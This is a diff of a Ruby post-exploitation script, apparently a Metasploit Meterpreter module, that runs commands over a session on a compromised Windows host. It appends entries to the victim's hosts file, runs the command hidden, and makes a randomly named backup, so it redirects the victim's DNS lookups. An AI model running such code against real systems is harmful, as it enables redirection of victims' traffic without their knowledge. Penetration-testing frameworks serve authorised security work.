@@ -38,14 +38,15 @@ end
 def add2hosts(session,record,hosts)
 	ip,host = record.split(",")
 	print_status("Adding Record for Host #{host} with IP #{ip}")
-	session.sys.process.execute("cmd /c echo #{ip}\t#{host} >> #{hosts}")
+	session.sys.process.execute("cmd /c echo #{ip}\t#{host} >> #{hosts}",nil, {'Hidden' => true})
 end
 
 #Make a backup of the hosts file on the target
 def backuphosts(session,hosts)
+	random = sprintf("%.5d",rand(100000))
 	print_status("Making Backup of the hosts file.")
-	session.sys.process.execute("cmd /c copy #{hosts} #{hosts}.back",nil, {'Hidden' => true})
-	print_status("Backup loacated in #{hosts}.back")
+	session.sys.process.execute("cmd /c copy #{hosts} #{hosts}#{random}.back",nil, {'Hidden' => true})
+	print_status("Backup loacated in #{hosts}#{random}.back")
 end
 # Clear DNS Cached entries
 def cleardnscach(session)
